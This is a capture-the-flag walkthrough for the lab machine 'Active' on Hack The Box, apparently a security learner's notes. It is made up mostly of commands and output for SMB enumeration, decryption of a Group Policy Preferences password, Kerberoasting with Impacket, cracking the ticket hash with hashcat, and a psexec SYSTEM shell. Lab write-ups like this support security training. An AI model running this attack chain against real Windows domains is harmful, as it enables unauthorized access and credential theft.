# Active

URL: https://app.hackthebox.com/machines/Active

Level: Easy

Date 3 Aug 2020

## Walkthrough

- [Enumeration](#enumeration)
- [Kerberoasting](#kerberoasting)
- [Admnistrator shell](#shell)

# Enumeration

## NMAP

Let's start with a basic nmap scan:

```
root@kali:/opt/htb/Active# nmap -T5 10.10.10.100
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-03 12:31 CEST
Nmap scan report for 10.10.10.100
Host is up (0.053s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.29 seconds
```

We explore a little bit samba service:

```
root@kali:/opt/htb/Active# smbclient -L \\\\10.10.10.100\\

Enter WORKGROUP\root's password:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We connect to `Replication` share and we grab everything:

```
root@kali:/opt/htb/Active# smbclient \\\\10.10.10.100\\Replication
Enter WORKGROUP\root's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018

\active.htb
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 12:37:44 2018
  Policies                            D        0  Sat Jul 21 12:37:44 2018
  scripts                             D        0  Wed Jul 18 20:48:57 2018

\active.htb\DfsrPrivate
  .                                 DHS        0  Sat Jul 21 12:37:44 2018
  ..                                DHS        0  Sat Jul 21 12:37:44 2018
  ConflictAndDeleted                  D        0  Wed Jul 18 20:51:30 2018
  Deleted                             D        0  Wed Jul 18 20:51:30 2018
  Installing                          D        0  Wed Jul 18 20:51:30 2018

\active.htb\Policies
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 12:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 12:37:44 2018

\active.htb\scripts
  .                                   D        0  Wed Jul 18 20:48:57 2018
  ..                                  D        0  Wed Jul 18 20:48:57 2018

\active.htb\DfsrPrivate\ConflictAndDeleted
  .                                   D        0  Wed Jul 18 20:51:30 2018
  ..                                  D        0  Wed Jul 18 20:51:30 2018

\active.htb\DfsrPrivate\Deleted
  .                                   D        0  Wed Jul 18 20:51:30 2018
  ..                                  D        0  Wed Jul 18 20:51:30 2018

\active.htb\DfsrPrivate\Installing
  .                                   D        0  Wed Jul 18 20:51:30 2018
  ..                                  D        0  Wed Jul 18 20:51:30 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  GPT.INI                             A       23  Wed Jul 18 22:46:06 2018
  Group Policy                        D        0  Sat Jul 21 12:37:44 2018
  MACHINE                             D        0  Sat Jul 21 12:37:44 2018
  USER                                D        0  Wed Jul 18 20:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  GPT.INI                             A       22  Wed Jul 18 20:49:12 2018
  MACHINE                             D        0  Sat Jul 21 12:37:44 2018
  USER                                D        0  Wed Jul 18 20:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  GPE.INI                             A      119  Wed Jul 18 22:46:06 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Microsoft                           D        0  Sat Jul 21 12:37:44 2018
  Preferences                         D        0  Sat Jul 21 12:37:44 2018
  Registry.pol                        A     2788  Wed Jul 18 20:53:45 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Wed Jul 18 20:49:12 2018
  ..                                  D        0  Wed Jul 18 20:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Microsoft                           D        0  Sat Jul 21 12:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Wed Jul 18 20:49:12 2018
  ..                                  D        0  Wed Jul 18 20:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Windows NT                          D        0  Sat Jul 21 12:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Groups                              D        0  Sat Jul 21 12:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Windows NT                          D        0  Sat Jul 21 12:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  SecEdit                             D        0  Sat Jul 21 12:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  SecEdit                             D        0  Sat Jul 21 12:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  GptTmpl.inf                         A     1098  Wed Jul 18 20:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  GptTmpl.inf                         A     3722  Wed Jul 18 20:49:12 2018

                10459647 blocks of size 4096. 4878620 blocks available
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as GPE.INI (0.4 KiloBytes/sec) (average 0.3 K                                       iloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as GptTmpl.inf (                                       4.2 KiloBytes/sec) (average 1.5 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.7 KiloBytes                                       /sec) (average 1.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Registry.pol (13.2 KiloBytes/sec) (averag                                       e 3.4 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0.1 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as GptTmpl.inf (                                       20.7 KiloBytes/sec) (average 4.6 KiloBytes/sec)
smb: \> exit
```

We focus on Group Policy Preferences (GPP) file:

```	
root@kali:/opt/htb/Active# find . -name Groups.xml
./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```
rif.

https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/

https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp

and we found a password:

```
root@kali:/opt/htb/Active# cat ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

We decrypt cpassword:

```
root@kali:/opt/htb/Active# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```

So far, we found:

```
user: active.htb\svc_tgs
pass: GPPstillStandingStrong2k18
```

## Kerberoasting

Then we use `GetUserSPNs.py` (from Impacket suite) to get ticket:

```
root@kali:/opt/htb/Active# GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2018-07-30 19:17:40.656520



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$72f0f8cad9ad2149d2578dce023e391b$a0aedf26021b918e34c1b99430032008b280be672c4e7161a63f7245aa0124deed41b2f2f1db25fccec566d15a3d8e8c943ed66468f75e92bed78b3674283470e3152d0ec7d70ce1b553dc1bb94b518ed117b352f4cb46410d5329ee6cb017c88e9dcfb8691fc77eb853688ca37c31485c1ce012c467a0f47d9b0a5f4ff241d48b21f9bb3e934de5a537c311bc60b3c4c404c910597981f413cc547e122ec75ecf82b423499687ed23dce4b9a5eccd684b54ab578b5f8b473bdb6ed3fa9b7e7ca385624a49767f6511d3dd527eef191cca4936c673580fed15c51b4f1b8760d880428da3759bd17b2be27257657e1e7ae2a34a30bd9764e3405eed98a51d245b1d4305e7880c527e87f4122c79e459c8b3d4853591b897f6bdac9b26918f1978ca79ebefd7c2252ef34203c64a26d89eea8091c8e565b08c82569c4e0cf455c7ed3c8fef0d84829abcc5e6dd9e72b837f629fba2fa150cd4f7b24ec0f87d7db5a170d732ec3f2aabeceb3cf204a879094885647e04057d06ced16dd9d49797acabfbf7ade0e11514dccbcdcd2dd40fd810a522972babf46ef6b8445c25a3a4ce41f572442bea4000ce4fbdc5bd3e8597868fb9cc2ed0b0e64dff1ec0d3a75765f1002b6433559553db89ed3cc5e2fc7ba26602e2e83ff4e8adfb3c76df6ab4c3086c3490628eb70ac87aa89f6d3d836dedab1bfcc07bd029e40952b0c2eb60dfbc318603199223b46bffb8927e2ecfb050466402ef8d27624d05d14f843d9181b47c21bbfc96b9653725a1f2f2c78e7ec7f5c9903e225637a512b22de7d47f8fd5e8a20ea62f5574f5f911f9c495ddc4df41fe8c1dcdaac54c8010c8e84cbe1d1f88ed60ef5db691bf5f3e778ae92c575e0726b1a549bf32875965321b5e96ec5475e0914af8c6ed039e1818332927a51d9be4cc30c1b322787b6c7d87a85e594d3abc3e8025b1f7e6890ebf7e3fa6a040eabe1a5dabe43990d2b5b34898ebec23de8fa88a852b283ccea20a09fc9a897602287dd39555d8e70f06b57e46a7233727eb24d8cb57711441aa550832a7ab9721fa4f844d3149749f55306abc0545d0b2f5f4a124f337be6dfd0db6f1a5647c116b25b9c6d8c4a48d92ac8568fafe4ab969e668973bab2ab0332655993b2d4c8bdc1e9986383e446322258a168799b8e81b1e61a7e8801748222d3ba6e725a358a39168d01d864d307caa4be9971db202644140f2d50db7d3f750e501ef5b55dd7da52fe4237f87eb
```

We try to decrypt with `hashcat` and `rockyou.txt` wordlist:

```
D:\download\tools\hashcat-3.10\hashcat-3.10>hashcat64.exe -m 13100 active.txt d:\tmrc\hacking\wordlist\rockyou.txt
hashcat (v3.10) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
- Device #1: GeForce GTX 750 Ti, 512/2048 MB allocatable, 5MCU
- Device #1: WARNING! Kernel exec timeout is not disabled, it might cause you errors of code 702
             See the wiki on how to disable it: https://hashcat.net/wiki/doku.php?id=timeout_patch

Hashes: 1 hashes; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
Applicable Optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt
Watchdog: Temperature abort trigger set to 90c
Watchdog: Temperature retain trigger set to 75c

Cache-hit dictionary stats d:\tmrc\hacking\wordlist\rockyou.txt: 139921507 bytes, 14343297 words, 14343297 keyspace

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$72f0f8cad9ad2149d2578dce023e391b$a0aedf26021b918e34c1b99430032008b280be672c4e7161a63f7245aa0124deed41b2f2f1db25fccec566d15a3d8e8c943ed66468f75e92bed78b3674283470e3152d0ec7d70ce1b553dc1bb94b518ed117b352f4cb46410d5329ee6cb017c88e9dcfb8691fc77eb853688ca37c31485c1ce012c467a0f47d9b0a5f4ff241d48b21f9bb3e934de5a537c311bc60b3c4c404c910597981f413cc547e122ec75ecf82b423499687ed23dce4b9a5eccd684b54ab578b5f8b473bdb6ed3fa9b7e7ca385624a49767f6511d3dd527eef191cca4936c673580fed15c51b4f1b8760d880428da3759bd17b2be27257657e1e7ae2a34a30bd9764e3405eed98a51d245b1d4305e7880c527e87f4122c79e459c8b3d4853591b897f6bdac9b26918f1978ca79ebefd7c2252ef34203c64a26d89eea8091c8e565b08c82569c4e0cf455c7ed3c8fef0d84829abcc5e6dd9e72b837f629fba2fa150cd4f7b24ec0f87d7db5a170d732ec3f2aabeceb3cf204a879094885647e04057d06ced16dd9d49797acabfbf7ade0e11514dccbcdcd2dd40fd810a522972babf46ef6b8445c25a3a4ce41f572442bea4000ce4fbdc5bd3e8597868fb9cc2ed0b0e64dff1ec0d3a75765f1002b6433559553db89ed3cc5e2fc7ba26602e2e83ff4e8adfb3c76df6ab4c3086c3490628eb70ac87aa89f6d3d836dedab1bfcc07bd029e40952b0c2eb60dfbc318603199223b46bffb8927e2ecfb050466402ef8d27624d05d14f843d9181b47c21bbfc96b9653725a1f2f2c78e7ec7f5c9903e225637a512b22de7d47f8fd5e8a20ea62f5574f5f911f9c495ddc4df41fe8c1dcdaac54c8010c8e84cbe1d1f88ed60ef5db691bf5f3e778ae92c575e0726b1a549bf32875965321b5e96ec5475e0914af8c6ed039e1818332927a51d9be4cc30c1b322787b6c7d87a85e594d3abc3e8025b1f7e6890ebf7e3fa6a040eabe1a5dabe43990d2b5b34898ebec23de8fa88a852b283ccea20a09fc9a897602287dd39555d8e70f06b57e46a7233727eb24d8cb57711441aa550832a7ab9721fa4f844d3149749f55306abc0545d0b2f5f4a124f337be6dfd0db6f1a5647c116b25b9c6d8c4a48d92ac8568fafe4ab969e668973bab2ab0332655993b2d4c8bdc1e9986383e446322258a168799b8e81b1e61a7e8801748222d3ba6e725a358a39168d01d864d307caa4be9971db202644140f2d50db7d3f750e501ef5b55dd7da52fe4237f87eb:Ticketmaster1968

Session.Name...: hashcat
Status.........: Cracked
Input.Mode.....: File (d:\tmrc\hacking\wordlist\rockyou.txt)
Hash.Target....: $krb5tgs$23$*Administrator$ACTIVE.HTB$act...
Hash.Type......: Kerberos 5 TGS-REP etype 23
Time.Started...: Mon Aug 03 12:46:20 2020 (1 sec)
Speed.Dev.#1...: 10560.7 kH/s (12.21ms)
Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.......: 10814790/14343297 (75.40%)
Rejected.......: 1350/10814790 (0.01%)
Restore.Point..: 10487080/14343297 (73.11%)




[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => Started: Mon Aug 03 12:46:20 2020
Stopped: Mon Aug 03 12:46:26 2020
```

So far, we found Administrator password:

```
Ticketmaster1968
```

## Shell

Now we can access through `psexec`:

```
root@kali:/opt/htb/Active# psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file WcMpjKpG.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service byMP on 10.10.10.100.....
[*] Starting service byMP.....
[!] Press help for extra shell commands                                                                                                                                                      Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami                                                                                                                                                                   nt authority\system

C:\Windows\system32>
```



